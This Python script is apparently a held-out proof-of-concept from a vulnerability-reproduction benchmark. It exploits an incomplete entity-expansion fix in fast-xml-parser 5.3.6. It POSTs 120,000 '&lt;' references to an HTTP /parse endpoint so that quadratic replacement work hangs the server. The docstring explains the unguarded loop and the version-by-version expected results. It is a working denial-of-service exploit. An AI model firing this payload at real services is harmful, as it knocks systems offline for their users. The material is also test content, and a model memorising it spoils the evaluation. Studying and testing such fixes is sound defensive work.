#!/usr/bin/env python3
"""[HELD-OUT] bypass_poc -- CVE-2026-33036 residual exploit, delivered over EXTERNAL HTTP.

CVE-2026-26278 was fixed in fast-xml-parser 5.3.6 by an INCOMPLETE guard: expansion accounting
(maxTotalExpansions:1000 / maxExpandedLength:100000) was added to OrderedObjParser
.replaceEntitiesValue(), but ONLY inside the DOCTYPE-entities loop. The very next loop -- the
"standard entities" (lastEntities) loop that resolves the built-in XML entities &lt; &gt; &amp;
&quot; &apos; -- stayed a plain, UNCOUNTED `val = val.replace(entity.regex, entity.val)`. So a long
run of a standard entity reference is processed with the configured limits entirely ignored, and
fast-xml-parser's per-value entity replacement over that run is O(N^2) -> the synchronous parse
hangs the HTTP response. (The HTML-entity loop, holding the numeric `&#..;` handlers, was left
uncounted the same way.)

    <r>&lt;&lt;&lt;...(120000x)</r>

Delivered over the SAME real HTTP POST /parse (`new XMLParser({processEntities:true}).parse(req.body)`)
as the seed. On V1 (5.3.6, the CVE-2026-26278 fix = TARGET) the lastEntities loop is UNCOUNTED, so
120000 `&lt;` references drive quadratic work -> the response hangs past the 10 s HTTP timeout
(residual OPEN). On V2 (5.5.6, the CVE-2026-33036 fix) the SAME lastEntities loop is now wrapped
with `matches.length` accounting, so it throws `Entity expansion limit exceeded: 120000 > 1000`
after 1000 references and the response returns in ~30 ms (residual CLOSED).

Note the differential vs the seed: the DOCTYPE bomb is bounded on V1 (its loop was counted by
CVE-2026-26278), but this standard-entity run stays unbounded on V1 -- the fix is incomplete.

Expected: SLOW (response hangs -> HTTP timeout) on V0 (5.3.5) AND V1 (5.3.6); FAST/bounded on
V2 (5.5.6).

Usage: bypass_poc.py http://127.0.0.1:34921
"""
import http.client
import json
import socket
import sys
import time

PAYLOAD = "<r>%s</r>" % ("&lt;" * 120000)
HTTP_TIMEOUT_S = 10.0


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    data = PAYLOAD.encode("utf-8")
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/parse", body=data,
                  headers={"Content-Type": "text/xml", "Content-Length": str(len(data))})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "resp": None}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:34921"
    out = run(base)
    print(json.dumps({"poc": "residual/CVE-2026-33036-standard-entity-run", "payload_len": len(PAYLOAD),
                      "target": base, **out}, indent=2))
